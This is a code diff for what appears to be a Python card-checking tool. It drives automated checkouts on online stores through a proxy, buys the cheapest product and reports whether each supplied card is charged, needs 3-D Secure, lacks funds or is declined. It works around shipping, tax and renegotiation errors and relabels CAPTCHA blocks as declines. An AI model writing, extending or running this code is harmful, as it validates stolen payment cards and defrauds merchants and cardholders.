+            result.status = CheckStatus.ERROR
+            result.error = Exception(f"Step 9 failed: {e}")
+            return result
+
+        # Step 10
+        try:
+            queue_token5 = extract_queue_token(proposal5_body)
+            if not queue_token5:
+                raise Exception("could not extract queueToken")
+
+            is_digital      = not extract_is_shipping_required(proposal5_body)
+            delivery_handle, dh_shipping = extract_delivery_from_proposal(proposal5_body)
+            if not delivery_handle:
+                delivery_handle = extract_delivery_handle(proposal5_body)
+
+            shipping_amount = dh_shipping or extract_shipping_amount(proposal5_body)
+
+            if (not delivery_handle or not shipping_amount) and not is_digital:
+                # Try addresses for the shop's own currency-country FIRST: most
+                # shops (esp. food/local) only deliver domestically, and each
+                # address attempt burns the queue-token chain, so testing the
+                # likely-eligible addresses first is what reaches delivery
+                # before tokens run out.
+                fallbacks = get_fallback_addresses("ZZ")
+                home = [fb for fb in fallbacks if getattr(fb, "country_code", "").upper() == country.upper()]
+                rest = [fb for fb in fallbacks if getattr(fb, "country_code", "").upper() != country.upper()]
+                for fallback_addr in home + rest:
+                    try:
+                        fb_body, fb_addr = await proposal5_for_address_async(
+                            client, shop_url, checkout_url, checkout_token, session_token,
+                            stable_id, variant_id, price, proposal_id, build_id, source_token,
+                            queue_token3, email, fallback_addr, currency, country)
+                        fb_is_digital = not extract_is_shipping_required(fb_body)
+                        fb_handle, fb_shipping = extract_delivery_from_proposal(fb_body)
+                        if not fb_handle:
+                            fb_handle = extract_delivery_handle(fb_body)
+                        fb_amount = fb_shipping or extract_shipping_amount(fb_body)
+                        if os.environ.get("DEBUG_FALLBACK"):
+                            with open("/tmp/fallback_diag.log", "a") as _lf:
+                                _lf.write("%s addr=%s ct=%s handle=%s ship=%s\n" % (
+                                    shop_url, getattr(fallback_addr, "country", "?"),
+                                    getattr(fallback_addr, "city", ""),
+                                    fb_handle, fb_amount))
+                        if fb_is_digital or (fb_handle and fb_amount):
+                            proposal5_body, addr = fb_body, fb_addr
+                            is_digital      = fb_is_digital
+                            delivery_handle = fb_handle
+                            shipping_amount = fb_amount
+                            queue_token5    = extract_queue_token(proposal5_body)
+                            break
+                    except Exception as _e:
+                        if os.environ.get("DEBUG_FALLBACK"):
+                            with open("/tmp/fallback_diag.log", "a") as _lf:
+                                _lf.write("%s addr=%s EXC %s\n" % (
+                                    shop_url, getattr(fallback_addr, "country", "?"), _e))
+                        continue
+
+            if not delivery_handle and not is_digital:
+                result.retryable = True
+                try:
+                    import os as _os
+                    with open("/tmp/dump10_%d.json" % _os.getpid(), "w") as _df:
+                        _df.write(proposal5_body or "")
+                except Exception:
+                    pass
+                raise Exception("Step 10 failed: could not extract delivery handle")
+
+            signed_handles = extract_signed_handles(proposal5_body)
+
+            if not shipping_amount and not is_digital:
+                result.retryable = True
+                try:
+                    import os as _os
+                    with open("/tmp/dump10_%d.json" % _os.getpid(), "w") as _df:
+                        _df.write(proposal5_body or "")
+                except Exception:
+                    pass
+                raise Exception("Step 10 failed: could not extract shipping amount")
+            if not shipping_amount:
+                shipping_amount = "0.00"
+
+            total_amount = extract_checkout_total(proposal5_body)
+            if not total_amount:
+                total_amount = extract_seller_total(proposal5_body)
+            if not total_amount and is_digital:
+                total_amount = extract_running_total(proposal5_body)
+            if not total_amount:
+                try:
+                    import os as _os
+                    with open("/tmp/step10_%d_%d.json" % (_os.getpid(), int(_time.time() * 1000)), "w") as _df:
+                        _df.write(proposal5_body or "")
+                except Exception:
+                    pass
+                raise Exception("Step 10 failed: could not extract total amount"
+                                + (" :: " + proposal5_body[:400] if proposal5_body else ""))
+            result.amount = total_amount
+
+            attempt_token = generate_attempt_token(checkout_token)
+            current_tax   = extract_tax_amount(proposal5_body)
+            current_total = total_amount
+            cover_any     = False
+            payment_flex  = extract_payment_flexibility_template(proposal5_body)
+
+            for tax_attempt in range(1, 6):
+                submit_status, submit_body = await send_submit_for_completion(
+                    client, shop_url, checkout_url, checkout_token, session_token,
+                    stable_id, variant_id, price, submit_id, build_id, source_token,
+                    queue_token5, email, addr, delivery_handle, shipping_amount,
+                    current_total, pci_session_id, attempt_token, currency, country,
+                    signed_handles, is_digital=is_digital, tax_amount=current_tax,
+                    total_any=cover_any, payment_flex_terms_id=payment_flex)
+
+                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
+                    new_tax   = extract_tax_from_rejected(submit_body)
+                    new_total = extract_total_from_rejected(submit_body)
+                    if new_tax:
+                        current_tax = new_tax
+                    if new_total:
+                        current_total = new_total
+                    await asyncio.sleep(0.05)
+                    continue
+
+                if ("WAITING_PENDING_TERMS" in submit_body
+                        or "Waiting for pending terms" in submit_body):
+                    corr_total, corr_tax = extract_rejected_totals(submit_body)
+                    if corr_total and float(corr_total) > 0:
+                        current_total = corr_total
+                    if corr_tax:
+                        current_tax = corr_tax
+                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
+                    if dh:
+                        delivery_handle = dh
+                        if dh_ship:
+                            shipping_amount = dh_ship
+                    signed2 = extract_signed_handles(submit_body)
+                    if signed2:
+                        signed_handles = signed2
+                    await asyncio.sleep(extract_pending_poll_delay(submit_body))
+                    continue
+
+                if "cannot cover the total amount" in submit_body and not cover_any:
+                    corrected_total, corrected_tax = extract_rejected_totals(submit_body)
+                    if corrected_total and float(corrected_total) > 0:
+                        current_total = corrected_total
+                        if corrected_tax:
+                            current_tax = corrected_tax
+                    else:
+                        cover_any = True
+                    await asyncio.sleep(0.05)
+                    continue
+
+                # Flow / renegotiation rejection (terms mismatch, delivery
+                # changed, …) → refresh the corrected proposal and re-submit.
+                flow_code = extract_flow_error(submit_body)
+                if flow_code and "cannot cover the total amount" not in submit_body:
+                    if "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in flow_code:
+                        refreshed = extract_payment_flexibility_template(submit_body)
+                        if refreshed:
+                            payment_flex = refreshed
+                        try:
+                            import os as _os
+                            with open("/tmp/submit_flow_%d.json" % _os.getpid(), "w") as _ff:
+                                _ff.write(submit_body or "")
+                        except Exception:
+                            pass
+                    corr_total, corr_tax = extract_rejected_totals(submit_body)
+                    if corr_total and float(corr_total) > 0:
+                        current_total = corr_total
+                    if corr_tax:
+                        current_tax = corr_tax
+                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
+                    if dh:
+                        delivery_handle = dh
+                        if dh_ship:
+                            shipping_amount = dh_ship
+                    signed2 = extract_signed_handles(submit_body)
+                    if signed2:
+                        signed_handles = signed2
+                    await asyncio.sleep(extract_pending_poll_delay(submit_body))
+                    continue
+
+                break
+
+            _ = submit_status
+            check_submit_errors(submit_status, submit_body)
+
+            receipt_id = extract_receipt_id(submit_body)
+            if not receipt_id:
+                flow_code = extract_flow_error(submit_body)
+                if flow_code:
+                    try:
+                        import os as _os
+                        with open("/tmp/dump_flow_%d.json" % _os.getpid(), "w") as _ff:
+                            _ff.write(submit_body or "")
+                    except Exception:
+                        pass
+                    flow_msg = extract_any_error(submit_body)
+                    result.status      = CheckStatus.ERROR
+                    result.status_code = "REJECTED"
+                    result.error       = Exception(
+                        f"Checkout renegotiation failed: {flow_code}"
+                        + (f" | {flow_msg}" if flow_msg else ""))
+                    result.retryable   = True
+                    return result
+                error_msg = extract_any_error(submit_body)
+                if "CAPTCHA" in (error_msg or ""):
+                    error_msg = "CARD_DECLINED"
+                # Stable bank-decision codes we may surface verbatim. Anything
+                # else (human sentences, shop-specific errors, unknown codes)
+                # becomes GENERIC_ERROR, never a leaked raw message.
+                BANK_CODES = {
+                    "CARD_DECLINED", "INSUFFICIENT_FUNDS", "FRAUD_SUSPECTED",
+                    "ZIP_INVALID", "OUT_OF_STOCK", "PROCESSING_ERROR",
+                    "INVALID_PURCHASE_TYPE", "EXPIRED_CARD", "INVALID_CARD",
+                }
+                if error_msg:
+                    if error_msg in BANK_CODES:
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = error_msg
+                        result.error       = Exception(error_msg)
+                        result.retryable   = any(k in error_msg.lower()
+                                                 for k in ['inventory', 'retry', 'try again', 'generic'])
+                    else:
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = "GENERIC_ERROR"
+                        result.error       = Exception(error_msg or "GENERIC_ERROR")
+                        result.retryable   = True
+                else:
+                    result.status    = CheckStatus.ERROR
+                    result.error     = Exception("Step 10 failed: could not extract receiptId or error message")
+                    result.retryable = True
+                return result
+
+            receipt_session_token = extract_receipt_session_token(submit_body)
+            if not receipt_session_token:
+                raise Exception("Step 10 failed: could not extract sessionToken")
+            if not result.gateway:
+                result.gateway = extract_gateway_name(proposal5_body, submit_body)
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.error  = e
+            return result
+
+        # Step 11 — poll for receipt
+        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
+        type_name_re  = re.compile(
+            r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
+
+        for poll_num in range(1, 31):
+            try:
+                _, poll_body = await send_poll_for_receipt(
+                    client, shop_url, checkout_url, checkout_token, session_token,
+                    build_id, source_token, poll_for_receipt_id,
+                    receipt_id, receipt_session_token)
+
+                receipt_type = ""
+                m = type_name_re.search(poll_body)
+                if m:
+                    receipt_type = m.group(1)
+
+                result.status_code = extract_receipt_status_code(poll_body, receipt_type)
+
+                if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
+                    result.status      = CheckStatus.CHARGED
+                    result.status_code = "ORDER_PAID"
+                    result.receipt_url = checkout_url + "/thank_you"
+                    return result
+
+                if receipt_type == "ActionRequiredReceipt":
+                    result.status      = CheckStatus.APPROVED
+                    result.status_code = "3DS_REQUIRED"
+                    return result
+
+                if receipt_type == "FailedReceipt":
+                    error_re   = re.compile(r'"code"\s*:\s*"([^"]+)"')
+                    em         = error_re.search(poll_body)
+                    error_code = em.group(1) if em else ""
+                    if "CAPTCHA" in error_code:
+                        error_code = "CARD_DECLINED"
+                    if error_code == "INSUFFICIENT_FUNDS":
+                        result.status = CheckStatus.DECLINED
+                        result.error  = Exception("INSUFFICIENT_FUNDS")
+                    elif error_code in ("CARD_DECLINED", "GENERIC_ERROR"):
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = "CARD_DECLINED"
+                        result.error       = Exception("CARD_DECLINED")
+                    elif error_code == "01003":
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = "CARD_DECLINED"
+                        result.error       = Exception("CARD_DECLINED")
+                        result.retryable   = True
+                    else:
+                        if "InventoryReservationFailure" in poll_body:
+                            result.status    = CheckStatus.ERROR
+                            result.retryable = True
+                        else:
+                            result.status = CheckStatus.DECLINED
+                            result.error  = Exception(error_code)
+                    return result
+
+                delay = 500
+                m2 = poll_delay_re.search(poll_body)
+                if m2:
+                    try:
+                        d = int(m2.group(1))
+                        if d > 0:
+                            delay = d
+                    except ValueError:
+                        pass
+                await asyncio.sleep(min(delay, 150) / 1000.0)
+
+            except Exception as e:
+                result.status = CheckStatus.ERROR
+                result.error  = Exception(f"poll {poll_num} failed: {e}")
+                return result
+
+        result.status = CheckStatus.ERROR
+        result.error  = Exception("exceeded 30 poll attempts")
+        return result
+
+    finally:
+        await client.close()
+
+
+async def run_checkout_for_card_async(shop_url: str, card_entry: str,
+                                      proxy_url: str = "") -> CheckResult:
+    """Public entry point. Runs the checkout on the cheapest product; if that
+    product turns out to be unshippable (Step-10 "no delivery strategy" — e.g.
+    a local-pickup-only or digital-only variant), re-runs with the next-cheapest
+    product a bounded number of times, so the store can actually reach the bank
+    and return a real card verdict (matches reference behavior)."""
+    exclude: set = set()
+    last: CheckResult = None
+    for _attempt in range(2):
+        last = await _run_checkout_once_async(shop_url, card_entry, proxy_url,
+                                              exclude=exclude or None)
+        if os.environ.get("DEBUG_FALLBACK"):
+            with open("/tmp/retry_diag.log", "a") as _lf:
+                _lf.write("%s attempt=%d status=%s retryable=%s picked=%s err=%s\n" % (
+                    shop_url, _attempt, last.status, last.retryable,
+                    last.picked_product_id, str(last.error or "")[:90]))
+        if last.status != CheckStatus.ERROR or not last.retryable:
+            break
+        e = str(last.error or "")
+        if not last.picked_product_id:
+            break
+        if "Step 10 failed" in e and ("delivery handle" in e or "shipping amount" in e):
+            exclude.add(last.picked_product_id)
+            continue
+        break
+    return last
